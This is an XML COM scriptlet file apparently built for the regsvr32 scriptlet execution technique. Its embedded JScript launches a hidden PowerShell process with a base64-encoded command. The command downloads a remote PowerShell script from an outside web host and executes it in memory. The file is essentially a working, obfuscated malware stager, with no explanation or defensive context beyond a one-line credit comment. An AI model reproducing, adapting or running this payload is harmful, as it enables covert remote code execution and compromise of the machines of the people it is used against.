<?XML version="1.0"?>
<scriptlet>
<registration
    progid="Test"
    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
    <!-- Learn from Casey Smith @subTee -->
    <script language="JScript">
        <![CDATA[
            ps  = "cmd.exe /c powershell.exe -nop -noni -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBjAGEAdAAuAGQAYQBzAGgAYQBiAGkALgBpAG4ALwBuAGUAdAB3AG8AcgBrAHMALgBwAHMAMQAnACkAKQA=";
            new ActiveXObject("WScript.Shell").Run(ps,0,true);

        ]]>
</script>
</registration>
</scriptlet>